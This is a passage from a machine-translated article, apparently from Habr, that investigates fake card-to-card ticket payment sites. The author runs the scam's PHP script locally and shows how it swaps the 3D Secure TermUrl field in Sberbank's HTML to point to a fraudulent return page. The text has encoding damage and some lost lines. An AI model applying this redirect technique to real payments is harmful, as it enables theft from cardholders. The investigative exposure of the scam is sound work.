Zeile 175 - Die Variable $ pp wird im Browser angezeigt. Da die Variable $ pp eine Zeichenfolge mit dem vollstÃ¤ndigen HTML-Code der Seite ist, wird dem Benutzer eine Seite angezeigt. Die angezeigte Seite unterscheidet sich Ã¤uÃŸerlich nicht von der ursprÃ¼nglichen Seite, die die Bank angegeben hat. Der Unterschied besteht nur innerhalb des HTML-Codes an der Stelle, an der der Link ersetzt wurde. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Was ist diese Seite, die die Bank bei Eingabe der richtigen Kartennummer angibt und auf der das Skript einen Link zur erfolgreichen Zahlungsseite auf einer betrÃ¼gerischen Website ersetzt? Und schlieÃŸlich sollte es wahrscheinlich noch einen 3D Secure-Scheck von den sendenden Banken geben, der keine Zahlung zulÃ¤sst? Der Code endete an der interessantesten Stelle und es gibt Zweifel, dass er ohne zusÃ¤tzliche knifflige Skripte, Formulare usw. funktionieren kann.</font></font><br>
<br>
<b>     .          - .     .       .</b><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ich fahre meine Bankkartennummer in die Datei aviacfg.php. Ich werde versuchen, die Ãœbertragung zu akzeptieren, wenn es natÃ¼rlich klappt. Ich Ã¶ffne die zuvor auf der Festplatte gespeicherte Formularseite. Dieses Formular wurde einfach im Browser gespeichert, als eine der betrÃ¼gerischen Websites besucht wurde, die zum Zeitpunkt des Schreibens des ersten Teils der VerÃ¶ffentlichung noch funktionierten. Das Formular wurde bereits mit der Summe von 2915 Rubel gespeichert, aber zum Testen ist es zu viel. Lass es uns Ã¤ndern. In jeder Form gibt es sichtbare und versteckte Felder. Versteckte Felder (Eingabe, Auswahl) unterscheiden sich nicht von normalen Feldern, auÃŸer dass sie nicht sichtbar sind. In solchen Feldern werden Dienstinformationen gespeichert, die der Benutzer nicht sehen muss. Eingabefelder werden auf zwei Arten ausgeblendet.</font></font><br>
<br>
<ul>
<li>  CSS ( display:none).    ,     (input),    , ( DIV)     input.</li>
<li>     â€”   ,  type=Â«hiddenÂ».      type=Â«textÂ».</li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In unserem Fall werden die Formularfelder mit type = "hidden" ausgeblendet. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wir drÃ¼cken im Browser F12 (Webentwicklungsmodus). Suchen Sie die richtige Stelle im HTML-Code und Ã¤ndern Sie den Texttyp = "versteckt" in Typ = "Text" fÃ¼r zwei oder mehr Eingabeelemente. Jetzt sehen wir die Felder, in denen die Summe und der Servicecode (Code) gespeichert sind. Reduzieren Sie die Menge von 2915rub auf 20rub. Geben Sie nun die Daten Ihrer zweiten Bankkarte in das Formular ein. Geld sollte von dieser Karte abgebucht werden, wenn eine Ãœberweisung mÃ¶glich ist. </font></font><br>
<br>
<img src="https://habrastorage.org/files/ad2/9e5/fa2/ad29e5fa23e54550a59d9b54dd808ada.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wir bestÃ¤tigen das Formular durch Klicken auf die SchaltflÃ¤che "Bezahlen". Nach dem Klicken auf die SchaltflÃ¤che wird das Skript payp2p.php gestartet, das die in das Formular eingegebenen Daten empfÃ¤ngt.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zu meiner Ãœberraschung sah ich nach Eingabe der realen Kartennummer und Klicken auf die SchaltflÃ¤che "Bezahlen" im Testformular die Sberbank-Seite (die Bank, von der die Ãœberweisung erfolgt) auf dem Bildschirm und forderte mich auf, den 3D Secure-BestÃ¤tigungscode einzugeben. </font></font><br>
<br>
<img src="https://habrastorage.org/files/587/7a4/aa3/5877a4aa3a514b3bb171c8ba1e264f07.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Auch auf meinem Handy erhielt ich von der Sberbank eine SMS mit einem Code.</font></font><br>
<br>
<img src="https://habrastorage.org/files/c3b/628/abc/c3b628abc43a446bb15606dec3b9f083.jpg"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vor dem Testen mit einer gÃ¼ltigen Kreditkarte ging ich davon aus, dass der 3D Secure-Code zur BestÃ¤tigung auf irgendeine Weise in den Benutzer â€ausgetrickstâ€œ und dann programmgesteuert verdeckt auf dieses Formular Ã¼bertragen werden muss. Es stellte sich jedoch heraus, dass alles viel einfacher war. Nachdem die Daten fÃ¼r die Ãœbertragung von Karte zu Karte an die Promsvyazbank-Website gesendet wurden, zeigt der Browser die Form der kartenausgebenden Bank an, von der die Ãœberweisung erfolgt. In meinem Fall ist dies die Sberbank. Diese Form muss nicht einmal gefÃ¤lscht werden. Das BestÃ¤tigungsformular wird auf der HTTPS-Website der Sberbank angezeigt. Opfer von BetrÃ¼gern selbst geben direkt in dieses ihnen vertraute Formular einen BestÃ¤tigungscode ein. Wenn danach die Ãœberweisung erfolgreich ist, wird das Geld belastet. Obwohl es theoretisch mÃ¶glich ist, gegen eine solche Ãœberweisung zu protestieren, ist es weit davon entfernt, dass das Geld zurÃ¼ckgegeben wird.Die Wahrscheinlichkeit einer RÃ¼ckerstattung wird von vielen Faktoren beeinflusst, einschlieÃŸlich der Frage, wie schnell sich das â€Opferâ€œ bei seiner Bank bewerben wird.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
HTML-Code der Seite, die Sberbank ausgibt, um 3D Secure unter dem Spoiler zu bestÃ¤tigen. </font><font style="vertical-align: inherit;">Der Code wurde wÃ¤hrend des Tests erhalten, indem die Variable $ page in eine Textdatei geschrieben wurde. </font><font style="vertical-align: inherit;">Zeile 166 des Skripts payp2p.php.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sicherer 3D-HTML-Seitencode vor dem Ersetzen der Zeile</font></font></b><div class="spoiler_text"><pre><code class="html hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ONLOAD</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"javascript:OnLoadEvent();"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ACTION</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://acs3.sbrf.ru:443/acs/pa?id=QAB6XaYQTRm-t_6DHVnp2Q"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">METHOD</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"post"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">NAME</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"ThreeDform"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">target</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"_self"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"PaReq"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"eJxVUmFPgzAQ/SuE966lY2iWo4aJOl1mcG7TfTK1VCCOwkpR9u9tJ3P6pbn37nLv+u7gsiu3zqdQTVHJ0PUG2HWE5FVayCx0V8ubswv3ksIyV0LET4K3SlCYi6ZhmXCKNHSTaCF24+doErywzeNyUZ7p1yCermVNHl0KhzSFXoCa/gMC6AhNJ8VzJjUFxneTuwfqYzLC54B6CKVQdzHFGAfYI8TH/pB4GNAPDZKVgl5Fi5jYx0meJtHDbLBYATpkgFet1GpPA38I6AigVVuaa12PEaqbNyY/BqoFZFlAp4GS1kaN6dIVKZ2pgu2f41s565JNs84SKbL9+z0bbXkIyFZAyrSgBHuBhz3fwcGYjMZDo3vggZVWnnojbMbvAdRWI/qb+cuAcVuZZRznPyIQXV1JYSqMlb8xpKLhVBf8Q2inZnsjbAlAp49cTa3PXBvrSKp1rqOvbZJVs/VXdPuez7vdZj59uw6t+4ciK1QYx7xz63kPANk2qF8s6m/BRP9u5BtPwMYZ"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"MD"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"161732779-506DEA0AD5677154"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"TermUrl"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://3ds.payment.ru/cgi-bin/cgi_link"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="javascript">
</span><span class="hljs-function"><span class="hljs-keyword"><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="javascript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="javascript"><span class="hljs-function"><span class="hljs-title">OnLoadEvent</span></span></span></span><span class="javascript"><span class="hljs-function"> (</span></span><span class="hljs-params"></span><span class="javascript"><span class="hljs-function"><span class="hljs-params"></span>) 
</span></span></span><span class="javascript">{
  </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">document</span></span></span><span class="javascript">.forms[</span><span class="hljs-number"><span class="javascript"><span class="hljs-number">0</span></span></span><span class="javascript">].submit();
}
</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span>
</code></pre></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
HTML-Code der Seite, nachdem er einen Teil des Textes unter dem Spoiler ersetzt hat. </font><font style="vertical-align: inherit;">Der Code wurde wÃ¤hrend des Tests erhalten, indem die Variable $ pp in eine Textdatei geschrieben wurde. </font><font style="vertical-align: inherit;">Zeile 174 des Skripts payp2p.php.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sicherer 3D-HTML-Seitencode nach dem Ersetzen einer Zeichenfolge</font></font></b><div class="spoiler_text"><pre><code class="html hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ONLOAD</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"javascript:OnLoadEvent();"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ACTION</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://acs3.sbrf.ru:443/acs/pa?id=QAB6XaYQTRm-t_6DHVnp2Q"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">METHOD</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"post"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">NAME</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"ThreeDform"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">target</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"_self"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"PaReq"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"eJxVUmFPgzAQ/SuE966lY2iWo4aJOl1mcG7TfTK1VCCOwkpR9u9tJ3P6pbn37nLv+u7gsiu3zqdQTVHJ0PUG2HWE5FVayCx0V8ubswv3ksIyV0LET4K3SlCYi6ZhmXCKNHSTaCF24+doErywzeNyUZ7p1yCermVNHl0KhzSFXoCa/gMC6AhNJ8VzJjUFxneTuwfqYzLC54B6CKVQdzHFGAfYI8TH/pB4GNAPDZKVgl5Fi5jYx0meJtHDbLBYATpkgFet1GpPA38I6AigVVuaa12PEaqbNyY/BqoFZFlAp4GS1kaN6dIVKZ2pgu2f41s565JNs84SKbL9+z0bbXkIyFZAyrSgBHuBhz3fwcGYjMZDo3vggZVWnnojbMbvAdRWI/qb+cuAcVuZZRznPyIQXV1JYSqMlb8xpKLhVBf8Q2inZnsjbAlAp49cTa3PXBvrSKp1rqOvbZJVs/VXdPuez7vdZj59uw6t+4ciK1QYx7xz63kPANk2qF8s6m/BRP9u5BtPwMYZ"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"MD"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"161732779-506DEA0AD5677154"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"TermUrl"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://p2p.localhost/sus.php?cd=BX3FKT"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="javascript">
</span><span class="hljs-function"><span class="hljs-keyword"><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="javascript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="javascript"><span class="hljs-function"><span class="hljs-title">OnLoadEvent</span></span></span></span><span class="javascript"><span class="hljs-function"> (</span></span><span class="hljs-params"></span><span class="javascript"><span class="hljs-function"><span class="hljs-params"></span>) 
</span></span></span><span class="javascript">{
  </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">document</span></span></span><span class="javascript">.forms[</span><span class="hljs-number"><span class="javascript"><span class="hljs-number">0</span></span></span><span class="javascript">].submit();
}
</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span>
</code></pre></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kurz gesagt, im HTML-Code der 3D Secure-Seite (in diesem Beispiel von Sberbank) die Zeile:</font></font><br>
<br>
<pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"TermUrl"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://3ds.payment.ru/cgi-bin/cgi_link"</span></span></span><span class="hljs-tag">&gt;</span></span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Programmgesteuert Ã¤ndert sich zu:</font></font><br>
 <br>
<pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"TermUrl"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://p2p.localhost/sus.php?cd=BX3FKT"</span></span></span><span class="hljs-tag">&gt;</span></span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Die Ersatzzeichenfolge ist die Adresse der Seite, an die die ausstellende Bankkarte des Absenders nach ÃœberprÃ¼fung des 3D Secure-Codes den Benutzer zurÃ¼ckgeben soll. Bevor das Skript die Zeile ersetzte, wurde die Promsvyazbank-Website als Absenderadresse angegeben. Nachdem das Skript die Zeile ersetzt hat, wird bereits eine Seite auf der betrÃ¼gerischen Website als Absenderadresse angegeben.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ich verstehe nicht genau, an welchem â€‹â€‹Punkt die Absenderadresse ersetzt wird, aber es funktioniert. In diesem Moment, in dem der Browser die https-Seite von Sberbank mit der Aufforderung zur Eingabe des 3D Secure-Codes anzeigt, gibt es keine Absenderadresse fÃ¼r eine Site, wenn Sie den Quell-HTML-Code der Seite im Browser anzeigen. Der HTML-Code dieser Seite hat eine LÃ¤nge von mehr als 400 Zeilen und unterscheidet sich vollstÃ¤ndig vom HTML-Code der oben dargestellten Sberbank-Antwortseite, der durch Schreiben der Variablen $ page (Zeile 166) und $ pp (Zeile 174) auf die Festplatte erfasst wurde.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wenn Sie den falschen 3D Secure-Code eingeben, zeigt Sberbank auf seiner Seite eine Meldung an, dass der Code falsch ist, und sendet eine weitere SMS. Sobald der richtige Code eingegeben wurde, wird er zur Zahlungsstelle oder zur Ersatzstelle umgeleitet. Das heiÃŸt, die Umleitung zur Zahlungsstelle selbst impliziert wahrscheinlich, dass von der Sberbank alle erforderlichen Verfahren abgeschlossen wurden. Die Sberbank dient hier als Testbeispiel. Die Ãœberweisung kann auch Ã¼ber eine andere Bank erfolgen.</font></font><br>
<br>
<img src="https://habrastorage.org/files/67f/61d/011/67f61d0110d6481ca5115d314953530c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Von der Seite des â€TicketkÃ¤ufersâ€œ sieht es so aus. Der KÃ¤ufer gibt bei einer vorbereiteten Zahlungsweise seine Kartennummer ein. Danach wird die 3D Secure Code-BestÃ¤tigungsseite fast sofort angezeigt und eine SMS mit einem BestÃ¤tigungscode kommt an. Die 3D Secure-Seite im Browser wird auf der Website der Bank des Kartenherausgebers des KÃ¤ufers unter Verwendung des HTTPS-Protokolls angezeigt. Die Seite mit dem Formular zur Eingabe der Kartennummer sieht mÃ¶glicherweise verdÃ¤chtig aus, aber die 3D Secure-BestÃ¤tigung auf der Website Ihrer Bank lÃ¤sst keinen Zweifel oder Verdacht aufkommen. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Achten Sie Ã¼brigens auf die Signatur â€Ticket Payâ€œ in der Zeile â€Descriptionâ€œ auf der 3D Secure-Seite von Sberbank. Diese Signatur wird im Skript payp2p.php festgelegt. In zukÃ¼nftigen Beispielen werden wir versuchen, dies zu Ã¤ndern. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kommen wir zurÃ¼ck zum Testen.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ich habe den Code per SMS auf der Sberbank-Seite eingegeben und nach dem Klicken auf die SchaltflÃ¤che "Senden" eine Warnung erhalten, dass die Daten Ã¼ber eine unsichere Verbindung gesendet werden. </font></font><br>
<br>
<img src="https://habrastorage.org/files/f0c/33c/ce6/f0c33cce63e54f30b07837ae52bd52c8.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nachdem ich bestÃ¤tigt hatte, dass ich mit dem Senden von Daten Ã¼ber eine unsichere Verbindung einverstanden bin, wurde ich zur </font></font><br>
<br>
<img src="https://habrastorage.org/files/e86/a82/2f6/e86a822f66024701ade52e4bc3388a38.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Seite </font><font style="vertical-align: inherit;">/sus.php?cd=â€¦ weitergeleitet </font><font style="vertical-align: inherit;">. Dies ist die RÃ¼ckgabeseite. Die Absenderadresse wird im Skript festgelegt. In diesem Fall wurde die Seite nicht gefunden. Der Grund ist jedoch klar: Die RÃ¼ckseite wurde nicht im Voraus vorbereitet. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Obwohl das Ziel fast erreicht war, ging das </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Geld von Karte zu Karte wirklich nicht vorbei</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Es gab keine zusÃ¤tzlichen SMS mit der Information, dass die Zahlung abgelehnt wurde usw.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ich entschied, dass der Grund fÃ¼r den Fehler beim ersten Versuch darin bestand, dass die lokale Site (localhost) an einer unsicheren http-Verbindung und die Sberbank-Site an einem sicheren http-Protokoll arbeitete. HTTP und https sind nicht sehr freundlich miteinander. Dies erklÃ¤rt Ã¼brigens, warum die im ersten Teil der VerÃ¶ffentlichung beschriebenen betrÃ¼gerischen Websites eine sichere https-Verbindung verwendeten, wenn auch mit dem einfachsten Zertifikat. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Um diese Annahme zu Ã¼berprÃ¼fen, musste ich das https-Protokoll auf der lokalen Site konfigurieren. Zu diesem Zweck wurden eine lokale p2p.localhost-DomÃ¤ne und ein selbstsigniertes Zertifikat erstellt. Infolgedessen sah die neue Adresse mit dem Testskript folgendermaÃŸen aus: </font></font><br>
<br>
<code>https://p2p.localhost/payp2p.php</code><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
AuÃŸerdem wurde im Skript die Adresse der Seite geÃ¤ndert, an die die RÃ¼ckgabe nach Eingabe des 3D Secure-Codes eingegeben wurde. Die RÃ¼ckseite selbst wurde ebenfalls vorbereitet.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wir versuchen erneut, eine Zahlung bereits mit einer lokalen Site zu leisten, die Ã¼ber das https-Protokoll funktioniert. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
